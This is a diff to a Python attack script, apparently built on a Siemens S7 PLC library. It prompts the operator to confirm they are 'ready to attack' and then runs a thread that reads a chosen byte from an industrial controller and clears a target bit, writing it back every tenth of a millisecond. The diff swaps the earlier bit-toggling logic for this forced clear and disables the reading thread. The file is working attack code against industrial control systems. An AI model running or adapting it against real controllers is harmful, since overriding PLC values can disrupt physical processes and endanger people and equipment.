@@ -56,27 +56,37 @@ print(f"The resting value for your specified byte: {startByte} and specified bit
 ready = input("Have you noted this down and are ready to attack? press y if ready")
 
 def readPLCByte():
-    mask = 1 << whatBit
+    mask0 = ~(1 << whatBit)
+    mask1 = (1 << whatBit)
     while True:
         with suppress(RuntimeError):
             readBytes = plc.read_area(area, 0, startByte, numberOfUnits)
             currentByte[0] = readBytes[0]
-            currentByte[0] = mask ^ currentByte[0]
-            time.sleep(0.6)  
+            # currentByte[0] = mask0 & currentByte[0]
+            currentByte[0] = mask1 | currentByte[0]
+            time.sleep(0.11)  
 
 def writeFlippedBit():
+    mask0 = ~(1 << whatBit)
+    mask1 = (1 << whatBit)
     while True:
         with suppress(RuntimeError): 
+            readBytes = plc.read_area(area, 0, startByte, numberOfUnits)
+            currentByte[0] = readBytes[0]
+            currentByte[0] = mask0 & currentByte[0]
+            # currentByte[0] = mask1 | currentByte[0]
             plc.write_area(area, 0, startByte, bytearray([currentByte[0]]))
+            # print(currentByte[0])
+            time.sleep(0.0001)  
             
 if(str(ready) != "y"):
     sys.exit()
 else:
     writeThread = threading.Thread(target=writeFlippedBit)
-    readThread = threading.Thread(target=readPLCByte)
+    # readThread = threading.Thread(target=readPLCByte)
 
+    # readThread.start()
     writeThread.start()
-    readThread.start()
 
     writeThread.join()
-    readThread.join()
+    # readThread.join()
